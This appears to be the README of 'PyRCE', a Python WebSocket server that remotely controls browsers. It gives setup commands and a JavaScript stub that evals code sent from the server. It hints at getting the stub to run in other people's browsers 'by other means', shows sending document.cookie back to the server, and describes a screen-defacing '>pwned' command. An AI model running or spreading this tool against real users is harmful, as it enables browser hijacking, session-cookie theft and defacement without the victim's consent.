# PyRCE

```bash
git clone https://github.com/jack-michaud/PythonWebsocketRCE.git
cd PythonWebsocketRCE
virtualenv env
pip install -r requirements.txt
python ./main.py
```

```
PyRCE - Commands: listen, list, control
>
```

## Usage
If you run `python main.py`, then run in the CLI:

`>listen`

It will listen for connections. 

To connect a browser, run this in the console (or get it to run by other means?):
```javascript
var socket = new WebSocket('ws://localhost:1337', 'chat'); 
socket.onmessage = function (event) {
    eval(event.data);
}
```
In the PyRCE console:
```
[*] Listening on 0.0.0.0:1337
[==>] Received incoming connection from ...
[*] Handling connection
[*] Is valid WebSocket: True
[<==] Attempting to make connection...
[*] Succeeded!

```
Then type:

```
>control
[?] Which client?
1. ...
2. ...
>[the number label of the session you wish to control]
```

Then you will be prompted to run any Javascript you want.

```
Javascript code interpreter! '>quit' to close out interpreter,
'>close' to close the client connection. '>help' for custom commands.
[?] Javascript Code to Execute on ...:

```
To send data back to the server, you can use `socket.send`. E.g.:

```javascript
socket.send(document.cookie);
```

### Custom Commands

See commands.py for implementations of custom commands for the Javascript interpreter. They support multiple command arguments and are easy to implement!

```python
# commands.py
class CommandExample(CMD):

    def __init__(self):
        super(CommandExample, self).__init__(
              "ExampleTitle",
              "commandcall",
              "Description of this example commmand")

    def get_payload(self):
        # You have access to self.argv[] for the argument array (self.argv[0] is the call)
        return "[Javascript to run]"
 ```
 
#### My favorite command: >pwned

```
PWN
|--- >pwned
|--- Clears the whole screen and replaces it with glitchy text (usage: >pwned [Text])

>pwned daniel sux
```
![img](https://lh3.googleusercontent.com/TuvEN0G0OIKL28mW59n9pqdCJhQJb-wIQFejSbKoYsn2_mZJi3pAZIiM5fqg0KENe9FuYDsaY9rGEMvrdyRpjKKWmgOozQFLm-EuC3F4Zz23CU0nUqzjeL6wStaws-evBEOqyWF-i5ehznR8TECr5lJsBqOfflcDco2fkMkXq86pfJ_y03ThZAoIHMv_0pShKiVgI4TB7F74lwFBjRlD21uVhcLJhfTgdk1aFRpuF034upazQc3FbbpJSsnhIHpF-XCLwRAcXoSF-DN3vobpg_ld5msezgp3IM1FE1TNrcPd0judTqvIJndOOn9d4ddt_jD6HLo8HpU6O-3EGbs23SpGXe_WNFqqA5GksYSF9YHDdwKnDkX_FNgnt0-ZdiojLQSdgcsG-sSbLVMsCZZreCN1SS5EmeA30_v_zEzpG6R9iFlBpmSXvbQh74ronCd8BL3iiZAuVkKbgspey6WjY3pamYaCztEmW2NghvWirE3hrNcCG8BTvlhCKzhMyBnl6zJupCJhxWX4yS7hAZU5B3Q3BKd8_TbwAGnDM4gtNMnLhdWMWJlKxT6Gmdbzmhm47EKgCI4Hr-vLJk_lAxdW3fWnwEEkrOa0gC2x13azW4bj2jlgVwih-Q=w600-h360-no)


